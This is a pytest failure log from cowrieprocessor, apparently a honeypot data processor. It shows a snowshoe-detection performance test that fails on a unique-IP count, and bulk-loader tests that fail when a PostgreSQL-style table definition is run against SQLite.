INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.702, snowshoe=True, single_attempt_ips=5000, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 10000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.701, snowshoe=True, single_attempt_ips=10000, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 25000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=25000, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 50000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=50000, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 75000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=75000, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 100000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=100000, coordinated_timing=True
_________ TestSnowshoePerformance.test_metrics_performance_integration _________

self = <test_snowshoe_performance.TestSnowshoePerformance object at 0x7756b43b7680>
large_snowshoe_dataset = [<Mock spec='SessionSummary' id='131213176607744'>, <Mock spec='SessionSummary' id='131213176608080'>, <Mock spec='Ses...176608752'>, <Mock spec='SessionSummary' id='131213176609088'>, <Mock spec='SessionSummary' id='131213176609424'>, ...]

    def test_metrics_performance_integration(self, large_snowshoe_dataset: List[SessionSummary]) -> None:
        """Test performance of metrics integration with large datasets."""
        detector = SnowshoeDetector()
    
        # Perform detection
        start_time = time.perf_counter()
        result = detector.detect(large_snowshoe_dataset, window_hours=24)
        detection_duration = time.perf_counter() - start_time
    
        # Create metrics
        metrics_start = time.perf_counter()
        metrics = create_snowshoe_metrics_from_detection(
            detection_result=result,
            analysis_duration=detection_duration,
            analysis_id="perf-test-001",
            window_hours=24,
        )
        metrics_duration = time.perf_counter() - metrics_start
    
        # Convert to status dict
        status_start = time.perf_counter()
        status_dict = metrics.to_status_dict()
        status_duration = time.perf_counter() - status_start
    
        total_time = detection_duration + metrics_duration + status_duration
    
        print("Metrics performance test:")
        print(f"  Detection: {detection_duration:.3f}s")
        print(f"  Metrics creation: {metrics_duration:.3f}s")
        print(f"  Status dict conversion: {status_duration:.3f}s")
        print(f"  Total: {total_time:.3f}s")
    
        # Performance assertions
        assert total_time < 35.0, f"Total time {total_time:.2f}s too high"
        assert metrics_duration < 1.0, f"Metrics creation {metrics_duration:.3f}s too slow"
        assert status_duration < 0.1, f"Status conversion {status_duration:.3f}s too slow"
    
        # Verify metrics accuracy
        assert metrics.total_sessions == 100000
>       assert metrics.unique_ips == 100000
E       AssertionError: assert 2540 == 100000
E        +  where 2540 = SnowshoeDetectionMetrics(analysis_id='perf-test-001', window_hours=24, analysis_timestamp=datetime.datetime(2025, 10, ...0.02952755905511811, behavioral_score=1.0, data_quality_score=0.515, enrichment_coverage=0.515, errors=[], warnings=[]).unique_ips

/home/speterson/cowrieprocessor/tests/performance/test_snowshoe_performance.py:465: AssertionError
---------------------------- Captured stdout setup -----------------------------
Creating 100,000 snowshoe sessions...
Created 100000 sessions
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:31:58,098:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
2025-10-18 18:31:58,098:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
2025-10-18 18:31:58,099:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 18:31:58,099:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 18:32:07,293:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.209, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:32:07,293:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.209, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
Metrics performance test:
  Detection: 9.251s
  Metrics creation: 0.000s
  Status dict conversion: 0.000s
  Total: 9.251s
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:59 Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 100000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.209, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
_____________________ test_bulk_loader_inserts_raw_events ______________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_inserts_raw_e0')

>   ???

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77567cce1c50>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:07,511:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:07,511:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:07,512:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:07,512:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:07,520:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:07,520:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:07,524:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:07,524:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:07,525:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:07,525:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:07,527:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:07,527:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:07,530:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:07,530:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:07,531:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:07,531:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:07,532:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:07,532:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:07,533:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:07,533:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:07,537:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:07,537:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:07,538:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:07,538:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:07,539:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:07,539:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:07,540:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:07,540:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:07,543:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,543:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,545:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,545:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,545:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,545:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:07,546:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:07,546:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
________________________ test_bulk_loader_is_idempotent ________________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_is_idempotent0')

>   ???

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:98: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b22ccad0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:08,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:08,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:08,066:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:08,066:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:08,073:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:08,073:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:08,076:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:08,076:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:08,078:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:08,078:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:08,080:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:08,080:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:08,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:08,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:08,085:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:08,085:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:08,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:08,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:08,087:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:08,087:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:08,091:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:08,091:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:08,092:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:08,092:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:08,093:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:08,093:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:08,094:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:08,094:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:08,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,098:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,098:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,098:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,098:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
